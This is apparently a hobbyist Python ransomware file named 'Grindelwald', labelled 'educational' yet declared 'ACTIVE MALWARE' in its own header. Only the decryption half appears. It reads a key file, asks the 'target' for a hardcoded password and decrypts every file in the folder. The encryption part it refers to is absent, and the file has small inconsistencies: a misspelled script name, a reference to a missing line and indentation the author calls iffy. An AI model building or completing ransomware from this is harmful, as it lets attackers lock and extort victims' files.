# # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#            _           _      _               _     _ #
#           (_)         | |    | |             | |   | |#
#  __ _ _ __ _ _ __   __| | ___| |_      ____ _| | __| |#
# / _` | '__| | '_ \ / _` |/ _ \ \ \ /\ / / _` | |/ _` |#
#| (_| | |  | | | | | (_| |  __/ |\ V  V / (_| | | (_| |#
# \__, |_|  |_|_| |_|\__,_|\___|_| \_/\_/ \__,_|_|\__,_|#
#  __/ |                                                #
# |___/                                                 #                                                    
#           By Lua, (Educational Purposes Only)         #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # 

#DISCLAIMER: THIS IS ACTIVE MALWARE, IF YOU RUN IT AND FORGET THE PASSWORD THEN CHECK THE SOURCE CODE (line:71)
#I HAVE WRITTEN BOTH .PY SCRIPTS IN ONE FILE SO IT CANNOT BE RUN BY ACCIDENT. (Indentation for python is also a bit iffy for these files)

#DECRYPTION CODE (grindeldecrypt.py)

import os
from cryptography.fernet import Fernet #Import cryptography library

files = []

for file in os.listdir(): 
    if file == "grindlewald.py" or file == "key.key": 
        continue 
    if os.path.isfile(file): 
        files.append(file) 

print(files) 


with open("key.key", "rb") as akey: #We need to open the key file so it can be used, we read this in binary instead of writing in binary since we aren't adding anything
    decryptkey = akey.read() #We assign the contents of the key file to the decryptkey variable by reading the file, (we do not write since we aren't adding a new key)

password = "voldemort" #To allow the decryption script to work we need to set a password
inputpwd = input("Enter password to decrypt files\n-----------------------\n") #We need to create a space for the target to enter our password

if inputpwd == password: #This line checks that the inputpwd is the same as the password we set
    for file in files: 
            with open(file, "rb") as afile: #We open the files that we encrypted and read the contents
                 contents = afile.read() #Then we set the contents of the file to a variable (contents)
            contents_decrypted = Fernet(decryptkey).decrypt(contents) #This script decrypts all files, so we just replace all 'encrypt' with 'decrypt' 
            with open(file, "wb") as afile: #We open the file that has had its contents decrypted
                afile.write(contents_decrypted) #Since all the decrypted contents have been assigned to contents_decrypted, we can just write it back into the file
                print("File has been decrypted...") #This is in the for loop, so every time a file is decrypted it will send this message, if you don't want this, just remove it from the for loop.

else: #If the password is incorrect
    print("Incorrect password.")
